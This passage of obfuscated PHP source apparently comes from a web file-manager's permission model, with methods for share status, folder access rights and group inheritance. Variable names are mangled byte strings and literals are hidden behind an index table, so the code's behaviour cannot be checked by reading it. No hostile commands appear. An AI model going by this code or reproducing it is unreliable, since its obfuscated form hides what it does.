=> $ÂµÍÔ™Ò[489], $ÂµÍÔ™Ò[490] => $ÂµÍÔ™Ò[491]); $‚òŸöÒú = $ÂµÍÔ™Ò[2036] . $æ–øæ¡­[$íÇšŠ‚¹]; $Øçæ–¾Æ = Model($ÂµÍÔ™Ò[2028])->where($Ÿ¢éñë©)->order($‚òŸöÒú)->selectPage(20); if (empty($Øçæ–¾Æ[$ÂµÍÔ™Ò[407]])) { return array(); } $¶Ò™Ñ‰Ç = array_to_keyvalue_group($Øçæ–¾Æ[$ÂµÍÔ™Ò[407]], $ÂµÍÔ™Ò[780], $ÂµÍÔ™Ò[631]); if (!empty($¶Ò™Ñ‰Ç[0])) { $“ôµíÂ“ = $¶Ò™Ñ‰Ç[0]; $Ÿ¢éñë© = array($ÂµÍÔ™Ò[631] => array($ÂµÍÔ™Ò[7], $“ôµíÂ“)); $Œ‘‘ÜñŒ = $this->where($Ÿ¢éñë©)->field($ÂµÍÔ™Ò[631])->select(); $Œ‘‘ÜñŒ = array_to_keyvalue($Œ‘‘ÜñŒ, $ÂµÍÔ™Ò[12], $ÂµÍÔ™Ò[631]); $Ù£éÄ•Ü = array_diff($“ôµíÂ“, $Œ‘‘ÜñŒ); if (!empty($Ù£éÄ•Ü)) { foreach ($Øçæ–¾Æ[$ÂµÍÔ™Ò[407]] as $ş¬Ü½Ä => $®‡›¼ó) { if (in_array($®‡›¼ó[$ÂµÍÔ™Ò[631]], $Ù£éÄ•Ü)) { unset($Øçæ–¾Æ[$ÂµÍÔ™Ò[407]][$ş¬Ü½Ä]); } } } } $this->_listDataApply($Øçæ–¾Æ[$ÂµÍÔ™Ò[407]]); return $Øçæ–¾Æ; } public function reportStatus($Å¥ÜÊëŸ) { $ùÖ£‹³ =& $_SERVER[¹òÍ›æş]; $Ñüğ³ë = array($ùÖ£‹³[437] => $Å¥ÜÊëŸ[$ùÖ£‹³[437]]); $ı„½šæ• = Model($ùÖ£‹³[2028])->where($Ñüğ³ë)->field($ùÖ£‹³[2037])->find(); if (!$ı„½šæ•) { return !1; } $„Ã¨Á¨° = array($ùÖ£‹³[780] => $Å¥ÜÊëŸ[$ùÖ£‹³[780]]); if ($Å¥ÜÊëŸ[$ùÖ£‹³[780]] == $ùÖ£‹³[2033] && $ı„½šæ•[$ùÖ£‹³[780]] == $ùÖ£‹³[2033]) { $„Ã¨Á¨°[$ùÖ£‹³[780]] = 0; } $£úÆ®ä½ = Model($ùÖ£‹³[2028])->where($Ñüğ³ë)->save($„Ã¨Á¨°); if ($Å¥ÜÊëŸ[$ùÖ£‹³[780]] == $ùÖ£‹³[475]) { if ($ı„½šæ•[$ùÖ£‹³[506]] != $ùÖ£‹³[208] && $this->shareFileMeta($ı„½šæ•[$ùÖ£‹³[506]])) { $this->shareFileMeta($ı„½šæ•[$ùÖ£‹³[506]], 0); } $this->remove($ı„½šæ•[$ùÖ£‹³[631]]); return !0; } if ($£úÆ®ä½ && $Å¥ÜÊëŸ[$ùÖ£‹³[780]] == $ùÖ£‹³[2033]) { $ƒÏ™×ºÕ = $„Ã¨Á¨°[$ùÖ£‹³[780]] == $ùÖ£‹³[2033] ? 1 : 0; $this->shareFileMeta($ı„½šæ•[$ùÖ£‹³[506]], $ƒÏ™×ºÕ); $this->removeByFile($ı„½šæ•[$ùÖ£‹³[506]]); } return $£úÆ®ä½; } private function removeByFile($ÛôÁ¡î) { $éºÕŞ¯  =& $_SERVER[¹òÍ›æş]; $èÒ¿Â = Model($éºÕŞ¯ [855])->where(array($éºÕŞ¯ [506] => $ÛôÁ¡î))->field($éºÕŞ¯ [440])->select(); $Ô•§ö«Æ = array_to_keyvalue($èÒ¿Â, $éºÕŞ¯ [12], $éºÕŞ¯ [440]); $à®ÏîÑ = array($éºÕŞ¯ [440] => array($éºÕŞ¯ [7], $Ô•§ö«Æ), $éºÕŞ¯ [526] => 1); $èÒ¿Â = $this->where($à®ÏîÑ)->field($éºÕŞ¯ [631])->select(); if (empty($èÒ¿Â)) { return; } $˜‚Ê–‰’ = array_to_keyvalue($èÒ¿Â, $éºÕŞ¯ [12], $éºÕŞ¯ [631]); $this->remove($˜‚Ê–‰’); } private function shareFileMeta($äÍ ¿ìö, $…ØößÍò = null) { $ãÚˆÛªü =& $_SERVER[¹òÍ›æş]; $«‚ç–”Ú = array($ãÚˆÛªü[506] => $äÍ ¿ìö, $ãÚˆÛªü[104] => $ãÚˆÛªü[2038]); if (is_null($…ØößÍò)) { return Model($ãÚˆÛªü[2039])->where($«‚ç–”Ú)->find(); } $«‚ç–”Ú[$ãÚˆÛªü[412]] = $…ØößÍò; Model($ãÚˆÛªü[2039])->add($«‚ç–”Ú, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\x6f\x75\162\143\145\137\141\165\x74\150"; public function getAuth($ÑÛ‡Œî‰) { $ƒÑ…ŠØ  =& $_SERVER[¹òÍ›æş]; $œØ½ÀÜ = $this->sourceAuthSelect($ÑÛ‡Œî‰); $îÙ¹¥œç = array(); $Â“¿İ¿ª = array(); $‚Š’óÔ– = 2 << 25; foreach ($œØ½ÀÜ as $¸¨ì«¿á) { $è·€ê¹º = Model($ƒÑ…ŠØ [536])->listData($¸¨ì«¿á[$ƒÑ…ŠØ [1963]]); if (!$è·€ê¹º) { continue; } $îÙ¹¥œç[] = $¸¨ì«¿á; $‚¼ø‘Îµ = 0; if ($¸¨ì«¿á[$ƒÑ…ŠØ [449]] == SourceModel::TYPE_GROUP) { $‚¼ø‘Îµ = $‚Š’óÔ– * 2; } if ($¸¨ì«¿á[$ƒÑ…ŠØ [449]] == SourceModel::TYPE_USER) { $‚¼ø‘Îµ = $‚Š’óÔ–; } if ($¸¨ì«¿á[$ƒÑ…ŠØ [449]] == SourceModel::TYPE_USER && $¸¨ì«¿á[$ƒÑ…ŠØ [534]] == $ƒÑ…ŠØ [208]) { $‚¼ø‘Îµ = 0; } $Â“¿İ¿ª[] = $è·€ê¹º[$ƒÑ…ŠØ [451]] + $‚¼ø‘Îµ; } array_multisort($Â“¿İ¿ª, SORT_DESC, $îÙ¹¥œç); return $îÙ¹¥œç; } public function sourceAuthSelect($•±ØôÇœ) { $…æ„‚á =& $_SERVER[¹òÍ›æş]; static $ö‹àÛçã = array(); $»ÒğúÂñ = is_array($•±ØôÇœ) ? !1 : !0; if ($»ÒğúÂñ) { $•±ØôÇœ = array($•±ØôÇœ); } $´Šà Ù = array(); foreach ($•±ØôÇœ as $ÖÛÎ…Ôè) { if (isset($ö‹àÛçã[$ÖÛÎ…Ôè])) { $´Šà Ù[$ÖÛÎ…Ôè] = $ö‹àÛçã[$ÖÛÎ…Ôè]; } } if (count($´Šà Ù) == count($•±ØôÇœ)) { return $»ÒğúÂñ ? $´Šà Ù[$•±ØôÇœ[0]] : $´Šà Ù; } $ˆ¦Ğ›ãş = $…æ„‚á[2040]; $´–ÌÃÎÀ = array($…æ„‚á[440] => array($…æ„‚á[7], $•±ØôÇœ)); $¬šó¹Ç = $this->field($ˆ¦Ğ›ãş)->order($…æ„‚á[437])->where($´–ÌÃÎÀ)->select(); $ÂøºŒ Ä = array_to_keyvalue_group($¬šó¹Ç, $…æ„‚á[440]); foreach ($•±ØôÇœ as $ÖÛÎ…Ôè) { $ö‹àÛçã[$ÖÛÎ…Ôè] = $ÂøºŒ Ä[$ÖÛÎ…Ôè] ? $ÂøºŒ Ä[$ÖÛÎ…Ôè] : array(); } if ($»ÒğúÂñ) { return $¬šó¹Ç; } return $ÂøºŒ Ä; } public function setAuth($×²Ë¸©, $§ß×Ñ²«) { $ÉÂ¿–À =& $_SERVER[¹òÍ›æş]; $†İ¸Óú = Model($ÉÂ¿–À[1360])->sourceInfo($×²Ë¸©); if (!$†İ¸Óú) { return !1; } if ($†İ¸Óú[$ÉÂ¿–À[449]] != SourceModel::TYPE_GROUP) { return !1; } $¿«ÂÅİ = 1; $ÃĞÑ™ßö = $†İ¸Óú[$ÉÂ¿–À[534]]; if ($ÃĞÑ™ßö != $¿«ÂÅİ) { $ùÕÁ‰€‘ = array($ÉÂ¿–À[1859] => $ÃĞÑ™ßö); $¶¤‚¥¡· = Model($ÉÂ¿–À[1949])->field($ÉÂ¿–À[1669])->where($ùÕÁ‰€‘)->select(); $¶¤‚¥¡· = array_to_keyvalue($¶¤‚¥¡·, $ÉÂ¿–À[12], $ÉÂ¿–À[1669]); } $›ı•£Ñ„ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $Ş›û–«à = array(); foreach ($§ß×Ñ²« as $¥­Ä¾È) { if (!in_array($¥­Ä¾È[$ÉÂ¿–À[449]], $›ı•£Ñ„)) { show_json(LNG($ÉÂ¿–À[2041]), !1); } if ($ÃĞÑ™ßö != $¿«ÂÅİ) { if ($¥­Ä¾È[$ÉÂ¿–À[449]] == SourceModel::TYPE_GROUP) { } if ($¥­Ä¾È[$ÉÂ¿–À[534]] != 0 && !in_array($¥­Ä¾È[$ÉÂ¿–À[534]], $¶¤‚¥¡·)) { } } if ($¥­Ä¾È[$ÉÂ¿–À[534]] == 0) { $¥­Ä¾È[$ÉÂ¿–À[449]] = SourceModel::TYPE_USER; } $Ş›û–«à[] = array($ÉÂ¿–À[440] => $×²Ë¸©, $ÉÂ¿–À[449] => intval($¥­Ä¾È[$ÉÂ¿–À[449]]), $ÉÂ¿–À[534] => intval($¥­Ä¾È[$ÉÂ¿–À[534]]), $ÉÂ¿–À[1963] => intval($¥­Ä¾È[$ÉÂ¿–À[1963]]) ? intval($¥­Ä¾È[$ÉÂ¿–À[1963]]) : 0, $ÉÂ¿–À[2023] => intval($¥­Ä¾È[$ÉÂ¿–À[2023]]) ? intval($¥­Ä¾È[$ÉÂ¿–À[2023]]) : -1); } $this->where(array($ÉÂ¿–À[455] => $×²Ë¸©))->delete(); $this->addAll($Ş›û–«à); return !0; } public function authClear($Õ†Ë¤Ç) { $œ«äå€Ø =& $_SERVER[¹òÍ›æş]; $óøê½ì = Model($œ«äå€Ø[1360])->sourceInfo($Õ†Ë¤Ç); $Ä»ºìõ± = array($Õ†Ë¤Ç); if ($óøê½ì[$œ«äå€Ø[448]] == $œ«äå€Ø[98]) { $îÎœŸí = array($œ«äå€Ø[618] => array($œ«äå€Ø[578], $óøê½ì[$œ«äå€Ø[549]] . $Õ†Ë¤Ç . $œ«äå€Ø[579])); $Ä»ºìõ± = Model($œ«äå€Ø[1360])->field($œ«äå€Ø[455])->where($îÎœŸí)->getField($œ«äå€Ø[440], !0); $Ä»ºìõ±[] = $Õ†Ë¤Ç; } $this->where(array($œ«äå€Ø[455] => array($œ«äå€Ø[456], $Ä»ºìõ±)))->delete(); return !0; } public function getAllChildren($æÏ‰‰€è) { $£ú¯áì¸ =& $_SERVER[¹òÍ›æş]; $å†æİå½ = Model($£ú¯áì¸[1360])->sourceInfo($æÏ‰‰€è); if ($å†æİå½[$£ú¯áì¸[448]] != $£ú¯áì¸[98]) { return $this->sourceListAuth(array($æÏ‰‰€è)); } if ($å†æİå½[$£ú¯áì¸[449]] != SourceModel::TYPE_GROUP) { return array(); } $§Ãù‚õı = 1; $ß«½ãá = array($æÏ‰‰€è); if ($å†æİå½[$£ú¯áì¸[470]] == $£ú¯áì¸[208] && $å†æİå½[$£ú¯áì¸[534]] != $§Ãù‚õı) { $ß«½ãá = $this->groupChidldAllRootSource($å†æİå½[$£ú¯áì¸[534]]); } $ŠÜßùŞ = $this->field($£ú¯áì¸[440])->group($£ú¯áì¸[440])->select(); $ŠÜßùŞ = array_to_keyvalue($ŠÜßùŞ, $£ú¯áì¸[12], $£ú¯áì¸[440]); if (!$ŠÜßùŞ) { return array(); } $¦‰ŸÈŠá = $£ú¯áì¸[2042]; $øğ™ ÇÙ = array($£ú¯áì¸[440] => array($£ú¯áì¸[7], $ŠÜßùŞ), $£ú¯áì¸[469] => $£ú¯áì¸[208]); $Ñı×Ëëá = Model($£ú¯áì¸[855])->field($¦‰ŸÈŠá)->where($øğ™ ÇÙ)->select(); $Îş¸¾Áø = array($æÏ‰‰€è); foreach ($Ñı×Ëëá as $ÎÁëŸò„) { foreach ($ß«½ãá as $¶óÙğ) { $Å·½•ùü = $£ú¯áì¸[50] . $¶óÙğ . $£ú¯áì¸[50]; $Æ­ù›§™ = $ÎÁëŸò„[$£ú¯áì¸[549]] . $ÎÁëŸò„[$£ú¯áì¸[440]] . $£ú¯áì¸[50]; if (strstr($Æ­ù›§™, $Å·½•ùü)) { $Îş¸¾Áø[] = $ÎÁëŸò„[$£ú¯áì¸[440]]; break; } } } return $this->sourceListAuth($Îş¸¾Áø); } private function sourceListAuth($ÔÍ‹üòş) { $÷Óöˆí =& $_SERVER[¹òÍ›æş]; $ÓŒÉ¬ºÕ = Model($÷Óöˆí[1360])->sourceListInfo($ÔÍ‹üòş, !0); $¦¬¬ˆ§÷ = $this->sourceAuthSelect($ÔÍ‹üòş); $èÓ¸êóÔ = array(); $ÂûÈ–İÅ = array(); foreach ($ÓŒÉ¬ºÕ as $ÙõÄªµ±) { unset($ÙõÄªµ±[$÷Óöˆí[494]]); unset($ÙõÄªµ±[$÷Óöˆí[492]]); unset($ÙõÄªµ±[$÷Óöˆí[451]]); unset($ÙõÄªµ±[$÷Óöˆí[97]]); $íµ‘Š“ª = $¦¬¬ˆ§÷[$ÙõÄªµ±[$÷Óöˆí[440]]]; if (!$íµ‘Š“ª) { continue; } $ÙõÄªµ±[$÷Óöˆí[2043]] = $this->authTargetInfo($íµ‘Š“ª); $ÙõÄªµ±[$÷Óöˆí[547]] = rtrim($ÙõÄªµ±[$÷Óöˆí[553]], $÷Óöˆí[8]) . $÷Óöˆí[8] . ltrim($ÙõÄªµ±[$÷Óöˆí[547]], $÷Óöˆí[8]); $èÓ¸êóÔ[] = $ÙõÄªµ±; $°Øñª = count(explode($÷Óöˆí[8], trim($ÙõÄªµ±[$÷Óöˆí[547]], $÷Óöˆí[8]))); $ÂûÈ–İÅ[] = $°Øñª + ($ÙõÄªµ±[$÷Óöˆí[33]] == $÷Óöˆí[85] ? 0 : 1000); } array_multisort($ÂûÈ–İÅ, SORT_ASC, $èÓ¸êóÔ); return $èÓ¸êóÔ; } private function groupChidldAllRootSource($†Î±ğı´) { $õ³û“Ğ =& $_SERVER[¹òÍ›æş]; $áæ†è…  = Model($õ³û“Ğ[2044])->groupChildrenAll($†Î±ğı´); $¡ÔŸ’ıÕ = array($õ³û“Ğ[470] => 0, $õ³û“Ğ[534] => array($õ³û“Ğ[7], $áæ†è… ), $õ³û“Ğ[449] => SourceModel::TYPE_GROUP); $ƒø–Ìîü = Model($õ³û“Ğ[855])->field($õ³û“Ğ[440])->where($¡ÔŸ’ıÕ)->select(); $ƒø–Ìîü = array_to_keyvalue($ƒø–Ìîü, $õ³û“Ğ[12], $õ³û“Ğ[440]); return $ƒø–Ìîü; } private function authTargetInfo($›Ğ¯ç²Ô) { $ñöµë„ =& $_SERVER[¹òÍ›æş]; $äøõ®ÒÁ = array(); $ „ßŒú³ = array(); $úıâ¥¯î = 2 << 25; foreach ($›Ğ¯ç²Ô as $ÉÛ¯†¥) { $„¥Û‘™œ = Model($ñöµë„[536])->listData($ÉÛ¯†¥[$ñöµë„[1963]]); if (!$„¥Û‘™œ) { continue; } if ($ÉÛ¯†¥[$ñöµë„[449]] == SourceModel::TYPE_USER) { $ŒÛÈ±«ş = Model($ñöµë„[542])->getInfoSimpleOuter($ÉÛ¯†¥[$ñöµë„[534]]); if ($ŒÛÈ±«ş[$ñöµë„[1669]] == $ñöµë„[1215]) { continue; } if ($ŒÛÈ±«ş[$ñöµë„[1669]] == $ñöµë„[208]) { $ŒÛÈ±«ş[$ñöµë„[32]] = LNG($ñöµë„[2045]); } } else { $ŒÛÈ±«ş = Model($ñöµë„[550])->getInfoSimple($ÉÛ¯†¥[$ñöµë„[534]]); } if (!$ŒÛÈ±«ş) { continue; } $ŒÛÈ±«ş[$ñöµë„[505]] = $„¥Û‘™œ; $äøõ®ÒÁ[] = $ŒÛÈ±«ş; $ë‡½²Çå = 0; if ($ÉÛ¯†¥[$ñöµë„[449]] == SourceModel::TYPE_GROUP) { $ë‡½²Çå = $úıâ¥¯î * 2; } if ($ÉÛ¯†¥[$ñöµë„[449]] == SourceModel::TYPE_USER) { $ë‡½²Çå = $úıâ¥¯î; } if ($ÉÛ¯†¥[$ñöµë„[449]] == SourceModel::TYPE_USER && $ÉÛ¯†¥[$ñöµë„[534]] == $ñöµë„[208]) { $ë‡½²Çå = 0; } $ „ßŒú³[] = $„¥Û‘™œ[$ñöµë„[451]] + $ë‡½²Çå; } array_multisort($ „ßŒú³, SORT_DESC, $äøõ®ÒÁ); return $äøõ®ÒÁ; } public function getAllChildrenByUser($¦›«ù…Ü, $ÍÕ›Ë) { $°³ØÖï× =& $_SERVER[¹òÍ›æş]; $—¾Ï‚Å– = Model($°³ØÖï×[563])->getInfo($ÍÕ›Ë); if (!$ÍÕ›Ë || !$¦›«ù…Ü || !$—¾Ï‚Å–) { return array(); } $–»„Òòß = Model($°³ØÖï×[1360])->sourceInfo($¦›«ù…Ü); $ôÕŠİéí = array(); $¯¸Á—´õ = 1; if ($–»„Òòß[$°³ØÖï×[470]] == $°³ØÖï×[208] && $–»„Òòß[$°³ØÖï×[534]] != $¯¸Á—´õ && $this->groupContainUser($–»„Òòß[$°³ØÖï×[534]], $ÍÕ›Ë)) { foreach ($—¾Ï‚Å–[$°³ØÖï×[2046]] as $ ¡•Ãæ‡) { $™œÏå©‹ = Model($°³ØÖï×[550])->getInfo($ ¡•Ãæ‡[$°³ØÖï×[1859]]); $¢Ô˜é¼ƒ = Model($°³ØÖï×[563])->getInfoSimpleOuter($ÍÕ›Ë); $¢Ô˜é¼ƒ[$°³ØÖï×[505]] = $ ¡•Ãæ‡[$°³ØÖï×[451]]; if (Model($°³ØÖï×[536])->authCheckAction($ ¡•Ãæ‡[$°³ØÖï×[451]][$°³ØÖï×[451]], $°³ØÖï×[1880])) { continue; } $âÈ¢¤ = array($°³ØÖï×[32] => $°³ØÖï×[1235] . $™œÏå©‹[$°³ØÖï×[32]], $°³ØÖï×[440] => $™œÏå©‹[$°³ØÖï×[97]][$°³ØÖï×[440]], $°³ØÖï×[94] => KodIO::make($™œÏå©‹[$°³ØÖï×[97]][$°³ØÖï×[440]]), $°³ØÖï×[470] => $°³ØÖï×[208], $°³ØÖï×[449] => $°³ØÖï×[543], $°³ØÖï×[33] => $°³ØÖï×[582], $°³ØÖï×[547] => $™œÏå©‹[$°³ØÖï×[554]], $°³ØÖï×[1859] => $™œÏå©‹[$°³ØÖï×[1859]], $°³ØÖï×[551] => $™œÏå©‹[$°³ØÖï×[470]], $°³ØÖï×[2043] => array($¢Ô˜é¼ƒ)); $ôÕŠİéí[$âÈ¢¤[$°³ØÖï×[440]]] = $âÈ¢¤; } } $¡ÃÑâìô = array(); $°Ø¡œúï = $this->getAllChildren($¦›«ù…Ü); foreach ($°Ø¡œúï as $½¹²›”³) { $·„˜¢‚ = !1; foreach ($½¹²›”³[$°³ØÖï×[2043]] as $äÃò°¹ô) { if ($äÃò°¹ô[$°³ØÖï×[1669]]) { if ($äÃò°¹ô[$°³ØÖï×[1669]] == $ÍÕ›Ë) { $·„˜¢‚ = !0; break; } } if ($äÃò°¹ô[$°³ØÖï×[1859]]) { if ($this->groupContainUser($äÃò°¹ô[$°³ØÖï×[1859]], $ÍÕ›Ë)) { $·„˜¢‚ = !0; break; } } } if ($·„˜¢‚) { $¡ÃÑâìô[] = $½¹²›”³; } $‰ÂÚ•× = $½¹²›”³[$°³ØÖï×[440]]; if (isset($ôÕŠİéí[$‰ÂÚ•×])) { $½¹²›”³[$°³ØÖï×[2043]][] = $ôÕŠİéí[$‰ÂÚ•×][0]; $ôÕŠİéí[$‰ÂÚ•×] = !1; } } $ôÕŠİéí = array_filter(array_values($ôÕŠİéí)); $¡ÃÑâìô = array_merge($ôÕŠİéí, $¡ÃÑâìô); return $¡ÃÑâìô; } public function setAllChildrenByUser($ŒÑÊ÷Ğ, $ƒÔ¬Ø¶œ, $˜ÜÏø®·) { $äŠƒŞô‰ =& $_SERVER[¹òÍ›æş]; $ÚØÂ˜À˜ = $this->getAllChildrenByUser($ŒÑÊ÷Ğ, $ƒÔ¬Ø¶œ); if (!$˜ÜÏø®· || !$ÚØÂ˜À˜) { return !1; } foreach ($ÚØÂ˜À˜ as $¡€¸ÛÇ´) { $ü”šı‰ß = array(); foreach ($¡€¸ÛÇ´[$äŠƒŞô‰[2043]] as $Ôı»­®¡) { $”ÕËá¸Ş = $Ôı»­®¡[$äŠƒŞô‰[505]]; $ÖĞÎ£³ğ = $Ôı»­®¡[$äŠƒŞô‰[1669]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $ ­‡¿û» = $Ôı»­®¡[$äŠƒŞô‰[1669]] ? $Ôı»­®¡[$äŠƒŞô‰[1669]] : $Ôı»­®¡[$äŠƒŞô‰[1859]]; if ($Ôı»­®¡[$äŠƒŞô‰[1669]] && $Ôı»­®¡[$äŠƒŞô‰[1669]] == $ƒÔ¬Ø¶œ) { continue; } $ü”šı‰ß[] = array($äŠƒŞô‰[440] => $¡€¸ÛÇ´[$äŠƒŞô‰[440]], $äŠƒŞô‰[449] => $ÖĞÎ£³ğ, $äŠƒŞô‰[534] => intval($ ­‡¿û»), $äŠƒŞô‰[1963] => isset($”ÕËá¸Ş[$äŠƒŞô‰[437]]) ? intval($”ÕËá¸Ş[$äŠƒŞô‰[437]]) : 0, $äŠƒŞô‰[2023] => isset($”ÕËá¸Ş[$äŠƒŞô‰[2023]]) ? intval($”ÕËá¸Ş[$äŠƒŞô‰[2023]]) : -1); } $ü”šı‰ß[] = array($äŠƒŞô‰[440] => $¡€¸ÛÇ´[$äŠƒŞô‰[440]], $äŠƒŞô‰[449] => SourceModel::TYPE_USER, $äŠƒŞô‰[534] => intval($ƒÔ¬Ø¶œ), $äŠƒŞô‰[1963] => intval($˜ÜÏø®·), $äŠƒŞô‰[2023] => -1); $this->where(array($äŠƒŞô‰[455] => $¡€¸ÛÇ´[$äŠƒŞô‰[440]]))->delete(); $this->addAll($ü”šı‰ß); } return !0; } public function get($ô· Ã) { $¹¨Ú…˜† = $this->getSourceList(array($ô· Ã), !0); return $¹¨Ú…˜†[0]; } public function getSourceList($œ¹ßõ’„, $Ÿ´¾Ÿã³ = false, $¢Í¯ìÌ‚ = false) { $÷à°ÀÔ =& $_SERVER[¹òÍ›æş]; if (!$œ¹ßõ’„) { return array(); } $ç†œ›Ôí = Model($÷à°ÀÔ[1360]); if (!$Ÿ´¾Ÿã³ && count($œ¹ßõ’„) == 1) { $Ÿ´¾Ÿã³ = array(); $Ÿ´¾Ÿã³[$œ¹ßõ’„[0]] = $ç†œ›Ôí->sourceInfo($œ¹ßõ’„[0]); } if (!$Ÿ´¾Ÿã³) { $ïĞÑ×·ß = array($÷à°ÀÔ[455] => array($÷à°ÀÔ[456], $œ¹ßõ’„)); $Ÿ´¾Ÿã³ = $ç†œ›Ôí->field($÷à°ÀÔ[2047])->where($ïĞÑ×·ß)->select(); $Ÿ´¾Ÿã³ = array_to_keyvalue($Ÿ´¾Ÿã³, $÷à°ÀÔ[440]); } $ÔœâºÊ¸ = $œ¹ßõ’„; foreach ($Ÿ´¾Ÿã³ as $ªß›ïéª => $µ‚Ö€äŸ) { $ÈÜ„¥ÃÕ = $ç†œ›Ôí->parentLevelArray($µ‚Ö€äŸ[$÷à°ÀÔ[549]]); $ÔœâºÊ¸ = array_merge($ÔœâºÊ¸, array($ªß›ïéª), array_reverse($ÈÜ„¥ÃÕ)); } $ÔœâºÊ¸ = array_values(array_unique($ÔœâºÊ¸)); if (!$ÔœâºÊ¸) { return array(); } $ˆŠË¨‰– = $this->sourceAuthSelect($ÔœâºÊ¸); $·Ñ÷Ş§ˆ = array(); foreach ($ÔœâºÊ¸ as $Âîö®İÎ) { if (isset($ˆŠË¨‰–[$Âîö®İÎ])) { $·Ñ÷Ş§ˆ[$Âîö®İÎ] = $ˆŠË¨‰–[$Âîö®İÎ]; } } $¼ ş“ = $this->userIsRoot($¢Í¯ìÌ‚); $ß—½›ºÔ = AuthModel::authAll(); $ÍÀ˜»ß = array($÷à°ÀÔ[452] => $ß—½›ºÔ, $÷à°ÀÔ[2048] => array($÷à°ÀÔ[457] => 0, $÷à°ÀÔ[1865] => $ß—½›ºÔ, $÷à°ÀÔ[458] => LNG($÷à°ÀÔ[2049]), $÷à°ÀÔ[1882] => $÷à°ÀÔ[2050])); $›ü¸ÔÕ = array(); foreach ($Ÿ´¾Ÿã³ as $Âîö®İÎ => $¹İã‰êª) { if ($¼ ş“ && $GLOBALS[$÷à°ÀÔ[6]][$÷à°ÀÔ[1878]]) { $›ü¸ÔÕ[$Âîö®İÎ] = $ÍÀ˜»ß; continue; } $›ü¸ÔÕ[$Âîö®İÎ] = $this->makeSourceAuth($¹İã‰êª, $·Ñ÷Ş§ˆ, $¢Í¯ìÌ‚); } return $›ü¸ÔÕ; } public function authDeepCheck($Ô»–Üë®, $‚ôÀŒ‰ = false) { $Ş¢»ó–¯ =& $_SERVER[¹òÍ›æş]; $‚ôÀŒ‰ = $‚ôÀŒ‰ ? $‚ôÀŒ‰ : USER_ID; $‹¦ŒÕ½ = $this->makeAuthDeep($‚ôÀŒ‰); if (!in_array($Ô»–Üë®, $‹¦ŒÕ½[$Ş¢»ó–¯[2051]])) { return !1; } $­›—÷”¢ = array(); foreach ($‹¦ŒÕ½[$Ş¢»ó–¯[2052]] as $Şà·ÉÕë => $ş¬ø°œ‡) { if (!in_array($Ô»–Üë®, $ş¬ø°œ‡)) { continue; } $­›—÷”¢[] = $Şà·ÉÕë; } if (!$­›—÷”¢) { return !1; } $‹Õ­ = $­›—÷”¢ ? $­›—÷”¢[0] : $Ô»–Üë®; return array($Ş¢»ó–¯[452] => -1, $Ş¢»ó–¯[505] => array($Ş¢»ó–¯[457] => $Ş¢»ó–¯[1215], $Ş¢»ó–¯[1865] => $Ş¢»ó–¯[208], $Ş¢»ó–¯[458] => LNG($Ş¢»ó–¯[2053]), $Ş¢»ó–¯[1882] => $Ş¢»ó–¯[2054]), $Ş¢»ó–¯[2055] => LNG($Ş¢»ó–¯[2056]), $Ş¢»ó–¯[2057] => $this->sourceAuthInfo($‹Õ­)); } protected function makeAuthDeep($ä€·ïŒ÷ = false) { $Øéëıø» =& $_SERVER[¹òÍ›æş]; static $ÍÁÜ¥ö÷ = array(); $ä€·ïŒ÷ = $ä€·ïŒ÷ ? $ä€·ïŒ÷ : USER_ID; if (isset($ÍÁÜ¥ö÷[$ä€·ïŒ÷])) { return $ÍÁÜ¥ö÷[$ä€·ïŒ÷]; } $ìÂûÈ€³ = Model($Øéëıø»[2058])->listData(); $Ã‡¦àŞŒ = array(); foreach ($ìÂûÈ€³ as $„¶âşù) { if ($„¶âşù[$Øéëıø»[451]] == 0 && $„¶âşù[$Øéëıø»[1881]] == $Øéëıø»[98]) { $Ã‡¦àŞŒ[] = $„¶âşù[$Øéëıø»[437]]; } } $‹İÜçé£ = $this->userGroupParents($ä€·ïŒ÷); $±”õóîç = array($Øéëıø»[449] => SourceModel::TYPE_USER, $Øéëıø»[534] => $ä€·ïŒ÷); if ($‹İÜçé£) { $±”õóîç = array(array($Øéëıø»[449] => SourceModel::TYPE_USER, $Øéëıø»[534] => $ä€·ïŒ÷), array($Øéëıø»[449] => SourceModel::TYPE_GROUP, $Øéëıø»[534] => array($Øéëıø»[456], $‹İÜçé£)), $Øéëıø»[1027] => $Øéëıø»[1957]); } $„«¸—Æ = $this->field($Øéëıø»[2059])->where($±”õóîç)->select(); $ªÜó©êå = array(); $äáö¿ô¥ = array_to_keyvalue_group($„«¸—Æ, $Øéëıø»[440]); foreach ($äáö¿ô¥ as $‚ßäìØ¡ => $ç•íÄª) { $úöÊ§ûè = $this->authArrayCheck($ç•íÄª, $ä€·ïŒ÷); if ($úöÊ§ûè[$Øéëıø»[452]] > 0) { $ªÜó©êå[] = $‚ßäìØ¡ . $Øéëıø»[12]; } } if ($‹İÜçé£) { $î‡®ı•à = Model($Øéëıø»[550]); foreach ($‹İÜçé£ as $É×”¦Í) { $¬»Ô¢…¹ = $î‡®ı•à->getInfo($É×”¦Í); if (!$¬»Ô¢…¹ || !is_array($¬»Ô¢…¹[$Øéëıø»[97]])) { continue; } $ªÜó©êå[] = $¬»Ô¢…¹[$Øéëıø»[97]][$Øéëıø»[440]]; } } $Í„öˆ·Ş = array(); $ëæÅç‡ = $‹İÜçé£; $ìÇÁâ±¤ = Model($Øéëıø»[1360]); $î‡®ı•à = Model($Øéëıø»[550]); $£äºÒ­á = array(); $‘©Ù¾ = array(); $†‰üâŞ = array(); $Á­¢Âˆ = array(); if ($ªÜó©êå) { $’÷½¤†À = $ìÇÁâ±¤->where(array($Øéëıø»[440] => array($Øéëıø»[456], $ªÜó©êå)))->select(); foreach ($’÷½¤†À as $ÈÄà¯™) { $Ó‹úÙ = $ìÇÁâ±¤->parentLevelArray($ÈÄà¯™[$Øéëıø»[549]]); $Í„öˆ·Ş = array_merge($Í„öˆ·Ş, $Ó‹úÙ); $ëæÅç‡[] = $ÈÄà¯™[$Øéëıø»[534]]; $£äºÒ­á[$ÈÄà¯™[$Øéëıø»[440]]] = $Ó‹úÙ; $‘©Ù¾[$ÈÄà¯™[$Øéëıø»[440]]] = $ÈÄà¯™[$Øéëıø»[534]]; } } $ëæÅç‡ = array_values(array_unique($ëæÅç‡)); $á¶şøÇ = $ëæÅç‡; foreach ($á¶şøÇ as $É×”¦Í) { $¬»Ô¢…¹ = $î‡®ı•à->getInfo($É×”¦Í); $Ó‹úÙ = 